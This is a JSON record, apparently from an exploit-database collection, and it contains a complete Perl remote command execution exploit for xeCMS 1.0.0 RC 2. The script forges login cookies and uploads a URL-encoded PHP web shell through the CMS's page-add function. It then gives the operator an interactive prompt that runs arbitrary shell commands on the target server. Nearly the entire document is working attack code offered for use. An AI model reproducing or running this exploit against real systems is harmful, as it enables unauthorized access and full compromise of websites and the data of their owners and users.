{
  "id": "1459",
  "title": "xeCMS 1.0.0 RC 2 - &#039;cookie&#039; Remote Command Execution",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n#\r\n# xeCMS 1.0.0 RC 2 Remote Command Execution Exploit\r\n#\r\n# Copyright (c) 2006 cijfer <cijfer@netti!fi>\r\n# All rights reserved.\r\n#\r\n# never ctrl+c again.\r\n# cijfer$ http://target.com/dir\r\n# host changed to 'http://target.com/dir'\r\n# cijfer$ \r\n#\r\n# greets to JagX\r\n#\r\n# $Id: cijfer-xecmsxpl.pl,v 0.1 2006/01/29 22:13:00 cijfer Exp $\r\n\r\nuse LWP::UserAgent;\r\nuse URI::Escape;\r\nuse Getopt::Long;\r\nuse Term::ANSIColor;\r\nuse HTTP::Cookies;\r\n\r\n$res  = GetOptions(\"host=s\" => \\$host, \"proxy=s\" => \\$proxy, \"verbose+\" => \\$verbose);\r\n&usage unless $host;\r\n\r\nwhile()\r\n{\r\n\tprint color(\"green\"), \"cijfer\\$ \", color(\"reset\");\r\n\tchomp($command = <STDIN>);\r\n\texit unless $command;\r\n\tif($command =~ m/^http:\\/\\/(.*)/g)\r\n\t{\r\n\t\t$host=\"http://\".$1;\r\n\t\tprint \"host changed to '\";\r\n\t\tprint color(\"bold\"), $host.\"'\\n\", color(\"reset\");\r\n\t}\r\n\t&exploit($command,$host);\r\n}\r\n\r\nsub usage\r\n{\r\n\tprint \"xeCMS 1.0.0 RC 2 Remote Command Execution Exploit\\n\";\r\n\tprint \"usage: $0 -hpv\\n\\n\";\r\n\tprint \"  -h --host\\tfull address of target (ex. http://www.website.com/directory)\\n\";\r\n\tprint \"  -p --proxy\\tprovide an HTTP proxy (ex. 0.0.0.0:8080)\\n\";\r\n\tprint \"  -v --verbose\\tverbose mode\\n\\n\";\r\n\texit;\r\n}\r\n\r\nsub exploit\r\n{\r\n\tmy($command,$host) = @_;\r\n\r\n\t$cookie_h=$host;\r\n\t$cookie_h=~s/http:\\/\\/(.*?)\\/.*/$1/;\r\n\r\n\t$cij=LWP::UserAgent->new() or die;\r\n\t$cij->agent(\"Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:2.0) Gecko/20060101\");\r\n\t$cij->proxy(\"http\", \"http://\".$tunnel.\"/\") unless !$proxy;\r\n\t$cij->cookie_jar(HTTP::Cookies->new());\r\n\t$cij->cookie_jar->set_cookie(\"1\",\"xecms_username\",\"cijfer\",\"/\",$cookie_h,,,,,);\r\n\t$cij->cookie_jar->set_cookie(\"1\",\"xecms_password\",\"cijfer\",\"/\",$cookie_h,,,,,);\r\n\r\n\t$string  = \"%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F%3B\";\r\n\t$string .= uri_escape(shift);\r\n\t$string .= \"%3B%20%65%63%68%6F%20%5F%63%69%6A%66%65%72%5F\";\r\n\t$execut  = \"%3C%3F%24%68%61%6E%64%6C%65%3D%70%6F%70%65%6E\";\r\n\t$execut .= \"%28%24%5F%47%45%54%5B%63%69%6A%5D%2C%22%72%22\";\r\n\t$execut .= \"%29%3B%77%68%69%6C%65%28%21%66%65%6F%66%28%24\";\r\n\t$execut .= \"%68%61%6E%64%6C%65%29%29%7B%24%6C%69%6E%65%3D\";\r\n\t$execut .= \"%66%67%65%74%73%28%24%68%61%6E%64%6C%65%29%3B\";\r\n\t$execut .= \"%69%66%28%73%74%72%6C%65%6E%28%24%6C%69%6E%65\";\r\n\t$execut .= \"%29%3E%3D%31%29%7B%65%63%68%6F%22%24%6C%69%6E\";\r\n\t$execut .= \"%65%22%3B%7D%7D%70%63%6C%6F%73%65%28%24%68%61\";\r\n\t$execut .= \"%6E%64%6C%65%29%3B%3F%3E\";\r\n\r\n\t$out=$cij->post($host.\"/index.php?a=add&submit=1\",['autobr'=>'no', 'content'=>uri_unescape($execut), 'id'=>'cijfer', 'id_nav'=>'cijfer'],);\r\n\t$out=$cij->get($host.\"/index.php?p=cijfer&cij=\".$string);\r\n\r\n\tif($out->is_success)\r\n\t{\r\n\t\t@cij=split(\"_cijfer_\",$out->content);\r\n\t\tprint substr(@cij[1],1);\r\n\t}\r\n\tif($verbose)\r\n\t{\r\n\t\t$recv=length $out->content;\r\n\t\tprint \"Total received bytes: \".$recv.\"\\n\";\r\n\t\t$sent=length $command;\r\n\t\tprint \"Total sent bytes: \".$sent.\"\\n\";\r\n\t}\r\n}\r\n\r\n# milw0rm.com [2006-01-30]",
  "url": "https://www.exploit-db.com/exploits/1459"
}